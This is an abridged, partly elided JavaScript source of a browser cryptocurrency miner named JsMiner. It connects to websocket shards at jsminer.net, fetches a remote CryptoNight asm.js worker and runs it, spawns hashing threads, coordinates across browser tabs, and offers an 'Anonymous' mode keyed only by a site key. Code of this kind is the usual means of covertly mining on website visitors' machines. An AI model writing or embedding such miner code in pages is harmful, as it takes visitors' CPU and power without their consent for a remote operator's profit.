var hostname = 'jsminer.net';
self.JsMiner = self.JsMiner || {};
self.JsMiner.CONFIG = {
    WEBSOCKET_SHARDS: [[
        'wss://server1.' + hostname,
    ]],
};
JsMiner.CRYPTONIGHT_WORKER_BLOB = URL.createObjectURL(new Blob(['(' + cryptonightWorker + ')("' + 'https://'+ hostname + '");']));
(function(window) {
    "use strict";
    ...
    Miner.prototype.start = function(mode) {
        this._tab.mode = mode || JsMiner.IF_EXCLUSIVE_TAB;
        ...
        if (this._useWASM || this._asmjsStatus === "loaded") {
            ...
            xhr.addEventListener("load", function() {
                JsMiner.CRYPTONIGHT_WORKER_BLOB = window.URL.createObjectURL(new Blob([xhr.responseText]));
                this._asmjsStatus = "loaded";
                this._startNow()
            }.bind(this), xhr);
            xhr.open("get", JsMiner.CONFIG.LIB_URL + "cryptonight-asmjs.min.js", true);
            xhr.send()
        }
    };
    ...
    Miner.prototype.setNumThreads = function(num) {
        ...
        if (num > this._threads.length) {
            for (var i = 0; num > this._threads.length; i++) {
                var thread = new JsMiner.JobThread;
                if (this._currentJob) {
    ...
    Miner.prototype._startNow = function() {
        if (this._tab.mode !== JsMiner.FORCE_MULTI_TAB && !this._tab.interval) {
            this._tab.interval = setInterval(this._updateTabs.bind(this), 1e3)
        }
        if (this._tab.mode === JsMiner.IF_EXCLUSIVE_TAB && this._otherTabRunning()) {
            return
        }
        if (this._tab.mode === JsMiner.FORCE_EXCLUSIVE_TAB) {
            this._tab.grace = Date.now() + 3e3
        }
        if (!this.verifyThread) {
            this.verifyThread = new JsMiner.JobThread
        }
        this.setNumThreads(this._targetNumThreads);
        this._autoReconnect = true;
        if (JsMiner.CONFIG.REQUIRES_AUTH) {
            this._auth = this._auth || new JsMiner.Auth(this._siteKey);
    ...
    Miner.prototype._connect = function() {
        ...
        var shards = JsMiner.CONFIG.WEBSOCKET_SHARDS;
    ...
    window.JsMiner = window.JsMiner || {};
    window.JsMiner.IF_EXCLUSIVE_TAB = "ifExclusiveTab";
    window.JsMiner.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab";
    window.JsMiner.FORCE_MULTI_TAB = "forceMultiTab";
    window.JsMiner.Token = function(siteKey, goal, params) {
        var miner = new Miner(siteKey, params);
        miner._goal = goal || 0;
        return miner
    };
    window.JsMiner.User = function(siteKey, user, params) {
        var miner = new Miner(siteKey, params);
        miner._user = user;
        return miner
    };
    window.JsMiner.Anonymous = function(siteKey, params) {
        var miner = new Miner(siteKey, params);
        return miner
    }
})(window);
(function(window) {
    ...
    var JobThread = function() {
        this.worker = new Worker(JsMiner.CRYPTONIGHT_WORKER_BLOB);
    ...
    window.JsMiner.JobThread = JobThread
})(window);

 function cryptonightWorker(origin) {
 var Module = {
 ...
 function integrateWasmJS(Module) {
     ...
     var wasmTextFile = Module["wasmTextFile"] || "hash.wast";
     var wasmBinaryFile = Module["wasmBinaryFile"] || "app.wasm";
     var asmjsCodeFile = Module["asmjsCodeFile"] || "hash.temp.asm.js";
